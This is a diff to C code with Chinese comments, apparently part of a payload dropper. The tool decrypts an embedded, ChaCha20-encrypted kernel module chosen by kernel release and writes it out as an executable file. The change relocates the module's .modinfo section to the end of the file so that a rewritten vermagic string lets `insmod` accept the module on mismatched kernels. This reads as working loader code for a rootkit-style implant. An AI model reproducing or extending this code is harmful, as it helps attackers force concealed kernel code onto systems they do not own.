@@ -221,9 +221,14 @@ static const struct wind_payload *pick_payload(const char *release)
 	return exact ? exact : loose;
 }
 
-/* 取 .modinfo 段的 [start,end), 用来判断 vermagic 能不能写长 */
-static int find_modinfo(const unsigned char *buf, size_t len,
-			size_t *sec_start, size_t *sec_end)
+struct modinfo_loc {
+	size_t sh;      /* 段头在文件里的偏移 */
+	size_t off;     /* 段内容在文件里的偏移 */
+	size_t size;
+};
+
+/* 定位 .modinfo: 段头位置 + 内容范围 */
+static int find_modinfo(const unsigned char *buf, size_t len, struct modinfo_loc *loc)
 {
 	uint64_t shoff;
 	uint16_t shentsize, shnum, shstrndx;
@@ -269,51 +274,102 @@ static int find_modinfo(const unsigned char *buf, size_t len,
 			continue;
 		if (off > len || off + size > len)
 			return -1;
-		*sec_start = (size_t)off;
-		*sec_end = (size_t)(off + size);
+		loc->sh = sh;
+		loc->off = (size_t)off;
+		loc->size = (size_t)size;
 		return 0;
 	}
 	return -1;
 }
 
-/* 把 ko 里的 vermagic 版本段改成当前内核的。
- * 比原串短: 直接覆盖并用 NUL 截断。
- * 比原串长: 只有 .modinfo 里后面还有空余才写, 否则原样留着。 */
-static void patch_vermagic(unsigned char *buf, size_t len, const char *release)
+/* 原地写不下就把整段 .modinfo 搬到文件尾, 再把段头指过去。
+ * 内核只按段头读, 追加在 EOF 完全合法; 文件因此长几百字节。
+ * 返回新缓冲区(可能 realloc 过), NULL 表示失败。 */
+static unsigned char *fix_vermagic(unsigned char *buf, size_t *lenp, const char *release)
 {
 	const char *tag = "vermagic=";
+	size_t taglen = strlen(tag);
+	size_t devlen = strlen(release);
+	struct modinfo_loc ml;
 	unsigned char *val;
 	size_t toklen = 0;
-	size_t devlen;
-	size_t sec_s = 0, sec_e = 0;
+	size_t pos, end, bn = 0, newoff;
+	unsigned char *blob, *nb;
+	uint64_t o64, s64;
 
-	val = memmem(buf, len, tag, strlen(tag));
+	val = memmem(buf, *lenp, tag, taglen);
 	if (!val)
-		return;
-	val += strlen(tag);
-
-	while (val + toklen < buf + len && val[toklen] != ' ' && val[toklen] != 0)
+		return buf;
+	val += taglen;
+	while (val + toklen < buf + *lenp && val[toklen] != ' ' && val[toklen] != 0)
 		toklen++;
 
-	devlen = strlen(release);
 	if (toklen == devlen && !memcmp(val, release, devlen))
-		return;                         /* 本来就一致 */
+		return buf;                     /* 本来就一致 */
 
-	if (devlen <= toklen) {
+	if (devlen <= toklen) {                 /* 原地够放 */
 		memcpy(val, release, devlen);
 		val[devlen] = 0;
-		return;
+		return buf;
 	}
 
-	if (find_modinfo(buf, len, &sec_s, &sec_e) != 0)
-		return;
-	if ((size_t)(val - buf) + devlen + 1 > sec_e) {
-		printf("[+] vermagic 改不长 (载荷 %zuB / 本机 %zuB), insmod 可能拒绝\n",
-		       toklen, devlen);
-		return;
+	if (find_modinfo(buf, *lenp, &ml) != 0)
+		return buf;                     /* 不是 ELF, 动不了 */
+
+	/* 原地往后还有空档就直接覆盖 */
+	if ((size_t)(val - buf) + devlen + 1 <= ml.off + ml.size) {
+		size_t room = ml.off + ml.size - (size_t)(val - buf);
+
+		if (room >= devlen + 1) {
+			memcpy(val, release, devlen);
+			val[devlen] = 0;
+			return buf;
+		}
 	}
-	memcpy(val, release, devlen);
-	val[devlen] = 0;
+
+	/* 搬段: 逐条复制 modinfo 条目, vermagic 换成新的 */
+	blob = malloc(ml.size + devlen + 128);
+	if (!blob)
+		return buf;
+
+	pos = ml.off;
+	end = ml.off + ml.size;
+	while (pos < end) {
+		const unsigned char *e = buf + pos;
+		size_t elen = strnlen((const char *)e, end - pos);
+
+		if (elen == 0)
+			break;                  /* 后面全是填充 */
+		if (!strncmp((const char *)e, tag, taglen)) {
+			bn += (size_t)snprintf((char *)blob + bn, ml.size + devlen + 128 - bn,
+					       "%s%s", tag, release) + 1;
+		} else {
+			memcpy(blob + bn, e, elen);
+			bn += elen;
+			blob[bn++] = 0;
+		}
+		pos += elen + 1;
+	}
+	while (bn & 7)
+		blob[bn++] = 0;
+
+	newoff = (*lenp + 7) & ~(size_t)7;
+	nb = realloc(buf, newoff + bn);
+	if (!nb) {
+		free(blob);
+		return buf;
+	}
+	memset(nb + *lenp, 0, newoff - *lenp);
+	memcpy(nb + newoff, blob, bn);
+	free(blob);
+
+	o64 = newoff;
+	s64 = bn;
+	memcpy(nb + ml.sh + 0x18, &o64, 8);
+	memcpy(nb + ml.sh + 0x20, &s64, 8);
+
+	*lenp = newoff + bn;
+	return nb;
 }
 
 int wind_payload_extract(const char *dest)
@@ -358,7 +414,9 @@ int wind_payload_extract(const char *dest)
 	chacha20_xor(plain, plainlen, key, hit->nonce);
 	memset(key, 0, sizeof(key));
 
-	patch_vermagic(plain, plainlen, release);
+	plain = fix_vermagic(plain, &plainlen, release);
+	if (!plain)
+		return WPE_IO;
 
 	fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC, 0755);
 	if (fd < 0) {
